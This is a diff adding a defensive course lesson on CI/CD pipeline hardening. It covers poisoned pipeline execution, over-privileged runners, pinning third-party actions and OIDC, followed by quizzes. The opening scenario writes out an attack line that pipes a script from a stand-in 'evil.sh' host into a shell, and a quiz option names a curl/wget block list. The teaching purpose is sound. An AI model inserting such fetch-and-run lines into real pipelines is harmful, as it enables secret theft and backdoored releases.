@@ -1,0 +1,220 @@
+---
+concepts:
+- pipeline-security
+- ci-cd-security
+- secrets-in-ci
+- least-privilege-runner
+- poisoned-pipeline
+deepensInto: []
+estMin: 18
+lang: en
+lessonType: topic
+level: senior
+order: 4
+prereqs: []
+slug: 04-pipeline-hardening
+sources:
+- https://slsa.dev/
+- https://owasp.org/www-project-devsecops-guideline/
+spiral: []
+status: ready
+summary: 'CI runs attacker-influenced code with production credentials. The poisoned-pipeline
+  and over-privileged-runner are how that turns into a breach — and least-privilege,
+  trust boundaries, and pinned actions are how you stop it.'
+title: Pipeline hardening
+track: security-cloud
+unit: 03-iac-and-supply-chain-security
+---
+
+
+
+import Hook from "~/components/lesson/Hook.astro";
+import Explanation from "~/components/lesson/Explanation.astro";
+import Recap from "~/components/lesson/Recap.astro";
+import Inset from "~/components/lesson/Inset.astro";
+import Crux from "~/components/prose/Crux.astro";
+import KeyTakeaway from "~/components/prose/KeyTakeaway.astro";
+import RetrievalDrawer from "~/components/pedagogy/RetrievalDrawer.tsx";
+import Quiz from "~/components/pedagogy/Quiz.astro";
+import DragOrder from "~/components/pedagogy/DragOrder.astro";
+import TradeoffMatrix from "~/components/pedagogy/TradeoffMatrix.astro";
+import FlowDiagram from "~/components/diagram/FlowDiagram.astro";
+
+<Hook>
+A contributor opens a pull request against your repo. They never touch source — they edit `.github/workflows/ci.yml`, adding one line to the test job: `run: curl -s https://evil.sh | sh`. Your CI is triggered `on: pull_request`, the job runs on a self-hosted runner that already holds an AWS role and a long-lived `npm` token in its environment, and the workflow file the runner executes is the *attacker's edited copy* from the PR branch. CI builds the malicious fork, the script reads `AWS_*` and `NPM_TOKEN` out of the env, exfiltrates both, and publishes a backdoored package — all before a human ever clicks "approve." No production server was breached. The build server was, and it had the keys to everything. This is a poisoned pipeline, and the 2021 Codecov compromise and the 2024 `tj-actions/changed-files` incident are this exact shape at scale.
+</Hook>
+
+By the end of this lesson you'll know how an attacker-controlled workflow turns CI into a remote-code-execution box with production credentials, why an over-privileged runner makes a small foothold catastrophic, and which controls (least privilege, trust boundaries, pinned actions, OIDC) actually break the chain.
+
+<Crux>CI runs attacker-influenced code with prod credentials; poisoned-pipeline and over-privileged runners turn that into breach.</Crux>
+
+<Explanation>
+
+## Why CI is a high-value target
+
+A senior reflexes hard on one fact: **the pipeline is the softest path to production credentials in your whole system.** Your app servers are hardened, network-segmented, and monitored. Your CI runner builds untrusted code on every push, holds a deploy role, a registry token, and a signing key, and is watched by almost no one. An attacker who would never get RCE on your production fleet can often get it on your build agent just by sending a pull request.
+
+The asset CI holds is not "your code" — it is *trust*. The pipeline is the thing that decides what artifact ships to prod and signs it as authentic. Compromise the pipeline and you do not need to breach prod; the pipeline will ship your backdoor to prod for you, signed, and every downstream consumer that trusts your releases inherits it. That is why supply-chain attackers target build systems: one poisoned pipeline fans out to thousands of victims. SolarWinds (2020) was a build-system compromise; Codecov (2021) exfiltrated secrets from tens of thousands of CI environments by modifying a single bash uploader.
+
+## The poisoned pipeline: two distinct flavors
+
+"Poisoned pipeline execution" (PPE) means an attacker injects malicious commands into the *build process itself*, not the deployed app. There are two mechanisms, and conflating them is a common senior-interview miss.
+
+- **Direct PPE (D-PPE):** the attacker can edit the CI definition that runs. The classic trigger is a fork/branch pull request on a platform that runs the *PR's version* of the workflow file. Edit `ci.yml` to add `run: <malicious>`, open the PR, and CI executes your command with the runner's privileges before review.
+- **Indirect PPE (I-PPE):** the attacker cannot edit the workflow, but the workflow runs files the attacker *can* edit — a `Makefile`, an npm `postinstall` script, a test helper, a `Dangerfile`. The pipeline definition is locked down, but it shells out to `make test`, and `make test` runs attacker-controlled code from the PR. Locking the YAML is necessary but not sufficient.
+
+The lethal combination is PPE on a `pull_request`-triggered job that has access to secrets. On GitHub, the `pull_request` event from a fork deliberately runs *without* repository secrets and with a read-only token for exactly this reason — but the `pull_request_target` event runs in the context of the *base* repo with full secrets while checking out the *PR* head, which is the single most dangerous misconfiguration in the ecosystem. If your `pull_request_target` workflow does `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` and then builds, you have handed every fork author a secret-laden RCE.
+
+<FlowDiagram
+  label="The poisoned-pipeline attack path: an attacker opens a fork pull request editing the CI workflow or a build script, the runner executes the attacker's version of the pipeline while still holding production secrets and a privileged role, the malicious step reads credentials from the environment and exfiltrates them or publishes a backdoored artifact; scoping secrets out of untrusted-PR jobs and dropping runner privilege is what breaks the chain."
+  perRow={5}
+  hue="var(--d-crypto)"
+  nodes={[
+    { id: "pr", label: "Fork PR", sub: "edits ci.yml / Makefile" },
+    { id: "trigger", label: "CI triggers", sub: "runs PR's pipeline" },
+    { id: "runner", label: "Privileged runner", sub: "holds AWS + npm token" },
+    { id: "exfil", label: "Secrets exfiltrated", sub: "backdoor shipped" },
+    { id: "fix", label: "Least privilege", sub: "no secrets on untrusted PR" },
+  ]}
+  edges={[
+    { from: "pr", to: "trigger" },
+    { from: "trigger", to: "runner", label: "executes" },
+    { from: "runner", to: "exfil", label: "creds in env" },
+    { from: "runner", to: "fix", label: "the fix" },
+  ]}
+  caption="Poisoned pipeline in one path: CI executes the attacker's version of the build with the runner's standing credentials. Removing secrets from untrusted-PR jobs and dropping the runner's privilege turns RCE-with-the-keys into RCE-with-nothing-worth-stealing."
+/>
+
+## The over-privileged runner: why a small foothold goes nuclear
+
+PPE gives the attacker code execution. What that execution is *worth* is decided entirely by what the runner can reach — and this is the lever you actually control. An over-privileged runner is one that holds more authority than the job in front of it needs.
+
+The standing-credentials problem on self-hosted runners is the worst case. A self-hosted runner is a long-lived machine you own. If it has an AWS instance-profile role attached, every job that lands on it — including a poisoned PR job — can call the cloud metadata endpoint (`http://169.254.169.254/`) and assume that role. The credential was never in a secret store you could scope; it is ambient on the host. Worse, self-hosted runners are not ephemeral by default: malware from one job persists on disk and in caches for the next job, so one poisoned build can backdoor every subsequent build on that machine. GitHub explicitly warns against attaching self-hosted runners to public repos for this reason.
+
+Three privilege dimensions to drive to least-privilege:
+
+- **Token scope:** GitHub's default `GITHUB_TOKEN` can be read-only (`permissions: read-all` is not the default — set `permissions: contents: read` and grant write per-job only where needed). A token that can push to the registry or create releases is a token a poisoned job will use.
+- **Cloud role:** the deploy role should be assumable only by the *deploy* job on a *trusted* trigger (a push to a protected branch or a tag), never by a test job on a PR. Use OIDC federation so CI exchanges a short-lived, workflow-scoped token for cloud credentials instead of storing long-lived `AWS_ACCESS_KEY_ID` in CI secrets — and constrain the cloud trust policy to the specific repo, branch, and environment.
+- **Runner reachability:** a runner that can open connections into your production VPC is a runner that turns a build compromise into lateral movement. Build agents belong in an isolated, egress-filtered network, not next to your databases.
+
+<div data-lesson-visual class="overflow-x-auto my-6">
+  <table class="w-full text-sm border-collapse">
+    <thead>
+      <tr class="bg-surface-2">
+        <th class="border border-border px-3 py-2 text-left">Hardening control</th>
+        <th class="border border-border px-3 py-2 text-left">Attack it removes</th>
+        <th class="border border-border px-3 py-2 text-left">Concrete change</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td class="border border-border px-3 py-2">No secrets on untrusted-PR jobs</td>
+        <td class="border border-border px-3 py-2">Secret exfiltration via PPE</td>
+        <td class="border border-border px-3 py-2">Use <code>pull_request</code> (not <code>pull_request_target</code>); require approval before secret jobs run</td>
+      </tr>
+      <tr class="bg-surface-2">
+        <td class="border border-border px-3 py-2">Least-privilege token</td>
+        <td class="border border-border px-3 py-2">Push/release abuse from a poisoned job</td>
+        <td class="border border-border px-3 py-2"><code>permissions: contents: read</code> by default; grant write per-job</td>
+      </tr>
+      <tr>
+        <td class="border border-border px-3 py-2">OIDC short-lived cloud creds</td>
+        <td class="border border-border px-3 py-2">Theft of long-lived <code>AWS_*</code> keys</td>
+        <td class="border border-border px-3 py-2">Federate; trust policy scoped to repo + branch + environment</td>
+      </tr>
+      <tr class="bg-surface-2">
+        <td class="border border-border px-3 py-2">Pin third-party actions by SHA</td>
+        <td class="border border-border px-3 py-2">Compromised action tag (mutable)</td>
+        <td class="border border-border px-3 py-2"><code>uses: org/action@&lt;full-commit-sha&gt;</code>, not <code>@v4</code></td>
+      </tr>
+      <tr>
+        <td class="border border-border px-3 py-2">Ephemeral runners</td>
+        <td class="border border-border px-3 py-2">Persistence across jobs; ambient host role</td>
+        <td class="border border-border px-3 py-2">One-job-per-VM (just-in-time), torn down after; no instance profile</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+## The third-party action problem
+
+Most pipelines pull in dozens of community actions, each running with the workflow's privileges. `uses: some-org/setup-thing@v4` resolves a *mutable tag* — the maintainer (or an attacker who compromised them) can repoint `v4` to malicious code, and your next run silently executes it. This is exactly the March 2024 `tj-actions/changed-files` compromise: the attacker rewrote the action's tags to dump CI secrets into build logs across thousands of repos. The mitigation is to **pin every third-party action to a full commit SHA** (`@a1b2c3...`, not `@v4`), so the code you reviewed is the code that runs, and to treat a third-party action with the same suspicion as any other dependency — because it is one, executing in your most privileged environment.
+
+<Inset kind="why" lang="en">
+Why not just "review every PR before CI runs"? Because the most dangerous triggers run *before* review by design. A fork's `pull_request` job starts the moment the PR is opened — that is the point of CI, to give reviewers a green check. The defense can't be "a human reads it first"; it has to be that the pre-review job is *structurally unable to do harm*: no secrets in its environment, a read-only token, an ephemeral runner with no standing cloud role, and no network path to prod. Then it doesn't matter that an attacker controls the code — the code controls nothing worth taking. This is the same deny-by-default reflex as access control, applied to the build.
+</Inset>
+
+## How a senior sequences the hardening
+
+The order matters because the controls are not equal in value-per-effort. First, **kill standing credentials**: move off long-lived cloud keys to OIDC, and make sure no secret-bearing job runs on an untrusted PR. That single move neuters the poisoned pipeline's payoff. Second, **drop the token to read-only by default** and grant write narrowly. Third, **make runners ephemeral** so a foothold can't persist. Fourth, **pin actions by SHA** so your dependency surface stops shifting under you. Notice the through-line: you are assuming the attacker *will* get code execution in CI, and engineering so that when they do, the runner is a box with nothing worth stealing and nowhere worth going.
+
+<TradeoffMatrix
+  id="04-pipeline-hardening-tradeoff-1"
+  lessonSlug="04-pipeline-hardening"
+  lang="en"
+  prompt="A fork pull request can edit `ci.yml`, and your CI job builds the PR with an AWS deploy role and an npm publish token in scope. Pick the control that actually breaks the poisoned-pipeline chain."
+  options={[
+    { name: "Remove secrets and the privileged role from the untrusted-PR job; run it on an ephemeral runner with a read-only token and no path to prod, gating any secret-bearing step behind maintainer approval", summary: "Least privilege on untrusted code.", correct: true, justification: "This is the root fix: it assumes the attacker gets code execution (they edited the workflow) and removes everything that execution could steal or reach. With no secrets in the env, a read-only token, an ephemeral runner that holds no standing cloud role, and no network path to prod, the poisoned job runs attacker code that controls nothing of value. The trusted, secret-bearing deploy happens only on a protected trigger after review." },
+    { name: "Add a step at the top of the job that greps the diff for `curl`, `wget`, and `| sh` and fails the build if found", summary: "Blocklist the payload.", justification: "A blocklist of suspicious strings is trivially bypassed — base64, a fetch in code, an indirect call via a Makefile or postinstall script, a thousand other encodings. It's a heuristic on the perimeter that both misses real attacks and breaks legitimate builds. The job still runs with full secrets, so any payload that slips through wins." },
+    { name: "Require that all contributors sign a CLA and enable branch protection requiring one approving review before merge", summary: "Process gate at merge.", justification: "Branch protection gates the *merge*, but the poisoned job runs at PR-open, long before merge — that's the whole point of pre-merge CI. A CLA and a required review do nothing about code that executes with secrets before any human approves it. This confuses merge governance with build-time execution safety." },
+    { name: "Encrypt the secrets at rest and rotate the AWS keys every 90 days", summary: "Protect the secret store.", justification: "Encryption at rest and rotation protect against theft of the *store*, but the poisoned job is handed the *decrypted* secrets at runtime in its environment — it doesn't need to crack the vault, the runner already injected them. Rotation every 90 days is far too slow to matter once a key is exfiltrated and used in minutes. The fix is to not put the secret in that job at all." },
+  ]}
+/>
+
+<Quiz
+  id="04-pipeline-hardening-quiz-1"
+  lessonSlug="04-pipeline-hardening"
+  lang="en"
+  question="Why is a self-hosted runner with an attached AWS instance-profile role especially dangerous for a public repo's CI?"
+  choices={[
+    { label: "The role is ambient on the host, so any job — including a poisoned PR job — can reach the metadata endpoint and assume it, and a non-ephemeral runner lets malware persist to later builds", correct: true },
+    { label: "Self-hosted runners are slower, so attacks have more time to complete", misconception: "Speed isn't the issue. The danger is that the cloud role is attached to the host itself (not a scoped secret), reachable by any job via the metadata endpoint, and that the runner persists state between jobs." },
+    { label: "GitHub-hosted runners encrypt secrets but self-hosted ones don't", misconception: "Both inject secrets into the job environment the same way. The specific problem is the standing instance-profile role and the lack of per-job teardown on self-hosted machines." },
+    { label: "Self-hosted runners can't use OIDC, so they must use long-lived keys", misconception: "Self-hosted runners can use OIDC. The acute risk here is the attached instance-profile role being ambient on a persistent host that runs untrusted PR code." },
+  ]}
+/>
+
+<Quiz
+  id="04-pipeline-hardening-quiz-2"
+  lessonSlug="04-pipeline-hardening"
+  lang="en"
+  question="Your workflow locks down `ci.yml` so contributors can't edit it, but it still runs `make test`, and `make test` executes a `Makefile` that PRs can modify. What attack remains, and what's the category?"
+  choices={[
+    { label: "Indirect poisoned pipeline (I-PPE) — the workflow is locked but it runs attacker-controllable files; treat scripts the build executes as untrusted too", correct: true },
+    { label: "Nothing remains — locking the workflow definition fully closes poisoned-pipeline execution", misconception: "Locking the YAML only stops direct PPE. The build still shells out to attacker-editable files (Makefile, postinstall, test helpers), which is indirect PPE." },
+    { label: "Injection — sanitize the Makefile input before running it", misconception: "This isn't classic input injection; it's that the pipeline executes attacker-controlled build scripts with the runner's privileges. The category is indirect poisoned pipeline execution." },
+    { label: "Cryptographic failure — sign the Makefile to prevent tampering", misconception: "Signing the Makefile doesn't help when the PR legitimately changes it; the issue is that build scripts run untrusted code with secrets. That's I-PPE." },
+  ]}
+/>
+
+<DragOrder
+  id="04-pipeline-hardening-drag-1"
+  lessonSlug="04-pipeline-hardening"
+  lang="en"
+  prompt="Order the pipeline-hardening controls by value-per-effort, highest first (the senior sequencing):"
+  items={[
+    { id: "a", label: "Kill standing credentials: OIDC short-lived creds + no secrets on untrusted-PR jobs" },
+    { id: "b", label: "Drop GITHUB_TOKEN to contents: read by default; grant write per-job" },
+    { id: "c", label: "Make runners ephemeral so a foothold can't persist across jobs" },
+    { id: "d", label: "Pin every third-party action to a full commit SHA" },
+  ]}
+  correctOrder={["a", "b", "c", "d"]}
+/>
+
+</Explanation>
+
+<KeyTakeaway>CI executes attacker-influenced code with production credentials. Assume RCE in the build and engineer for least privilege: no secrets on untrusted-PR jobs, OIDC short-lived cloud creds, read-only tokens by default, ephemeral runners, and third-party actions pinned by SHA. A poisoned pipeline is only catastrophic when the runner is over-privileged.</KeyTakeaway>
+
+<RetrievalDrawer
+  client:load
+  id="04-pipeline-hardening-retrieval"
+  lang="en"
+  questions={[
+    { q: "Explain the difference between direct and indirect poisoned pipeline execution, and why locking the workflow file isn't enough.", a: "Poisoned pipeline execution (PPE) is when an attacker injects commands into the build process itself rather than the deployed app. Direct PPE (D-PPE) is when the attacker can edit the CI definition that runs — the classic case is a fork/branch pull request on a platform that executes the PR's own version of the workflow file, so adding `run: <malicious>` to ci.yml and opening the PR runs the command with the runner's privileges before review. Indirect PPE (I-PPE) is when the workflow is locked down but it still executes files the attacker can edit: the YAML shells out to `make test`, an npm `postinstall`, a Dangerfile, or a test helper, and a PR modifies that script. Locking the workflow file only closes direct PPE; it does nothing about the build's shelling out to attacker-controllable scripts, which is why you must treat every script the pipeline executes — and every third-party action — as untrusted code running in your most privileged environment." },
+    { q: "Why does an over-privileged runner turn a small CI foothold into a full breach, and what are the three privilege dimensions to minimize?", a: "PPE gives an attacker code execution; the over-privileged runner decides what that execution is worth. The worst case is a self-hosted runner with an attached cloud instance-profile role: the credential is ambient on the host, so any job — including a poisoned PR job — can hit the metadata endpoint (169.254.169.254) and assume the role, and because self-hosted runners aren't ephemeral by default, malware persists on disk and in caches to backdoor later builds. The three dimensions to drive to least privilege are: (1) token scope — make GITHUB_TOKEN read-only by default (permissions: contents: read) and grant write only per-job where needed, so a poisoned job can't push or release; (2) cloud role — the deploy role should be assumable only by the deploy job on a trusted trigger, ideally via OIDC federation that exchanges a short-lived workflow-scoped token (no long-lived AWS keys in CI), with the trust policy constrained to the specific repo, branch, and environment; and (3) runner reachability — keep build agents in an isolated, egress-filtered network with no path into the production VPC, so a build compromise can't become lateral movement." },
+  ]}
+/>
+
+<Recap lang="en">
+CI is the softest path to production credentials in your system: it builds untrusted code on every push while holding deploy roles, registry tokens, and signing keys, and it is watched far less than prod. A poisoned pipeline (PPE) is when an attacker injects commands into the build itself — directly by editing the workflow on a fork PR (D-PPE), or indirectly via attacker-editable build scripts the locked workflow still runs (I-PPE). The damage is decided by the runner: an over-privileged runner — especially a self-hosted one with an ambient cloud role that persists between jobs — turns code execution into stolen credentials and a backdoored release that fans out to every downstream consumer. The senior fix assumes RCE in the build and engineers for least privilege: no secrets on untrusted-PR jobs, OIDC short-lived cloud creds scoped to repo and branch, read-only tokens by default, ephemeral runners, and third-party actions pinned by full commit SHA (the lesson of `tj-actions/changed-files`). Now when you read a workflow, your first question is: if an attacker controlled this job's code, what could it steal and where could it reach — and have I made both answers "nothing"?
+</Recap>
